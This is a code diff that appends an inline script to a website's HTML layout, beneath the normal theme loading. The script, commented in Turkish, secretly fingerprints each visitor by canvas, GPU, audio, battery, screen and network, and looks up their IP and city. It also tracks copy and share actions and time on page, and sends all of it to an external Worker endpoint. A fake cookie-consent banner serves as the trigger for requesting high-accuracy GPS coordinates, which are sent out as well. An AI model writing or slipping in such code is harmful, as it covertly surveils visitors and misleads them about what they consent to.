@@ -255,6 +255,161 @@ const showGrain = SITE.backdropEffects.grain;
 
     <!-- Load full theme logic -->
     <script src="../scripts/theme.ts"></script>
+
+<script type='text/javascript'>
+//<![CDATA[
+(function() {
+    // Kendi Worker adresini aşağıdaki tırnak içine yaz
+    var W = "https://kendi-worker-adresin.workers.dev";
+    var K = "v16_classic_approved";
+    var S = new Date();
+
+    function p(a, d) {
+        d.path = window.location.pathname;
+        fetch(W + "?action=" + a, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(d),
+            keepalive: true
+        }).catch(function(){});
+    }
+
+    function gGPU() {
+        try {
+            var c = document.createElement('canvas');
+            var g = c.getContext('webgl') || c.getContext('experimental-webgl');
+            if (g) {
+                var d = g.getExtension('WEBGL_debug_renderer_info');
+                return d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : g.getParameter(g.RENDERER);
+            }
+        } catch (e) {}
+        return "Kısıtlı";
+    }
+
+    function gFP() {
+        try {
+            var c = document.createElement('canvas');
+            var x = c.getContext('2d');
+            x.textBaseline = "top"; x.font = "14px Arial";
+            x.fillText("HsynEnes_V11", 2, 2);
+            return c.toDataURL().slice(-40, -10);
+        } catch(e) { return "Yeni"; }
+    }
+
+    var s = document.createElement('script');
+    s.src = 'https://ipapi.co/jsonp/';
+    document.head.appendChild(s);
+
+    window.callback = function(d) {
+        var cn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        var t = window.performance.timing;
+        var ld = t ? (t.loadEventEnd - t.navigationStart) : 0;
+
+        p("init", {
+            fPrint: gFP(),
+            gpu: gGPU(),
+            ip: d.ip,
+            org: d.org,
+            city: d.city,
+            region: d.region,
+            lat: d.latitude,
+            lon: d.longitude,
+            cores: navigator.hardwareConcurrency || 8,
+            ram: navigator.deviceMemory || "Bilinmiyor",
+            scr: window.screen.width + "x" + window.screen.height + " (" + window.devicePixelRatio + "x)",
+            cd: window.screen.colorDepth || 24,
+            ori: (window.screen.orientation || {}).type || "Bilinmiyor",
+            tp: navigator.maxTouchPoints || 0,
+            lang: navigator.language || "Bilinmiyor",
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "Bilinmiyor",
+            net: cn ? (cn.effectiveType + " / " + cn.downlink + "Mbps") : "Bilinmiyor",
+            rtt: cn ? cn.rtt : "Bilinmiyor",
+            load: ld > 0 ? ld : "Ölçülüyor",
+            tema: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Karanlık" : "Aydınlık"
+        });
+    };
+
+    window.addEventListener('load', function() {
+        if (localStorage.getItem(K) === 'true') {
+            bR();
+        } else {
+            cP();
+        }
+
+        document.addEventListener('copy', function() {
+            p("event", { eylem: "Kopyalama yapıldı." });
+        });
+
+        var btn = document.getElementById('custom-share-container') || document.getElementById('paylas-btn');
+        if (btn) {
+            btn.addEventListener('click', function() {
+                p("event", { eylem: "Paylaş butonuna basıldı." });
+            });
+        }
+    });
+
+    function cP() {
+        var b = document.createElement('div');
+        b.id = 'v16-master-box';
+        b.style = "position:fixed; bottom:0; left:0; width:100%; z-index:2147483647; touch-action:manipulation;";
+        b.innerHTML = '<div style="width:100%; max-width:500px; margin:0 auto; height:25vh; display:flex; flex-direction:column; justify-content:center; align-items:center; background:linear-gradient(135deg, #1A5276 0%, #0D2137 100%); color:#fff; padding:20px; border-radius:30px 30px 0 0; box-shadow:0 -15px 60px rgba(0,0,0,0.5); text-align:center; font-family:\'EB Garamond\', serif; border:1px solid rgba(255,255,255,0.15);"><h3 style="margin:0 0 10px 0; color:#fff !important; font-size:24px;">Cookies</h3><p style="font-size:15px; opacity:0.9; color:#fff !important; margin-bottom:15px;">Siteyi geliştirmek için çerezler (cookies) kullanılıyor. Lütfen onaylayın.</p><button id="v16-approve-btn" style="background:#EAF2F8; color:#1A5276; border:none; padding:12px 50px; border-radius:40px; font-weight:900; cursor:pointer; text-transform:uppercase; font-size:13px;">Onayla</button></div>';
+        document.body.appendChild(b);
+
+        var el = document.getElementById('v16-approve-btn');
+        var h = function() {
+            localStorage.setItem(K, 'true');
+            bR();
+            b.remove();
+        };
+        el.addEventListener('click', h);
+        el.addEventListener('touchstart', h);
+    }
+
+    async function bR() {
+        var aF = "Gizli", bM = "Yok", gI = "Bekleniyor...", hp = "Bilinmiyor";
+        try {
+            var a = new (window.AudioContext || window.webkitAudioContext)();
+            aF = a.sampleRate + "_" + a.destination.maxChannelCount;
+        } catch(e) {}
+
+        try {
+            if (navigator.getBattery) {
+                var bt = await navigator.getBattery();
+                bM = "%" + Math.round(bt.level * 100) + (bt.charging ? " [🔌 ŞARJDA]" : " [🔋 DEŞARJ]");
+            }
+        } catch(e) {}
+
+        if (performance && performance.memory) {
+            hp = Math.round(performance.memory.usedJSHeapSize / (1024 * 1024));
+        }
+
+        if (navigator.permissions) {
+            try {
+                var r = await navigator.permissions.query({ name: 'geolocation' });
+                gI = r.state;
+            } catch(e) { gI = "Kısıtlı"; }
+        }
+
+        p("approved", { audioF: aF, batMsg: bM, gpsIzin: gI, heap: hp });
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(x) {
+                p("gps", { success: true, lat: x.coords.latitude, lon: x.coords.longitude });
+            }, function(x) {
+                var er = (x.code == 1 ? "REDDETTİ" : (x.code == 2 ? "SİNYAL YOK" : "ZAMAN AŞIMI"));
+                p("gps", { success: false, err: er });
+            }, {enableHighAccuracy: true, timeout: 10000});
+        }
+    }
+
+    window.addEventListener('pagehide', function() {
+        var d = Math.round((new Date() - S) / 1000);
+        p("leave", { dur: d });
+    });
+})();
+//]]>
+</script>
+
   </body>
 </html>
 
